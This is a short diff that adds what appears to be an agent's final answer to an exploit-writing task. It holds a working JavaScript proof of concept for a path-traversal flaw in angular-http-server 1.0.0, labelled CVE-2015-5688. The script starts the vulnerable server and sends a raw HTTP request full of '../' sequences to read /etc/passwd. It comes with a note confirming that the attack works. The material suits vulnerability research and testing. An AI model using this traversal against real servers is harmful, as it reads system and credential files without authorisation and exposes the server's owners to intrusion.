@@ -1,0 +1,30 @@
+Confirmed — path traversal works, reading `/etc/passwd`. Final exploit:
+
+```javascript
+// Exploit for angular-http-server@1.0.0 - Path Traversal (CVE-2015-5688)
+// Requiring the package starts an HTTP server on port 8000 that serves
+// files directly from `req.url` with zero sanitization, allowing
+// arbitrary file read via "../" sequences.
+require("angular-http-server");
+
+var net = require("net");
+
+setTimeout(function () {
+    var socket = net.connect(8000, "127.0.0.1", function () {
+        // Raw socket bypasses client-side URL dot-segment normalization
+        // so the "../" sequences reach the server unmodified.
+        socket.write(
+            "GET /../../../../../../../../etc/passwd HTTP/1.1\r\n" +
+            "Host: 127.0.0.1\r\n" +
+            "Connection: close\r\n\r\n"
+        );
+    });
+
+    var body = "";
+    socket.on("data", function (chunk) { body += chunk; });
+    socket.on("end", function () {
+        console.log("Leaked file content via path traversal:\n" + body);
+        process.exit(0);
+    });
+}, 500);
+```
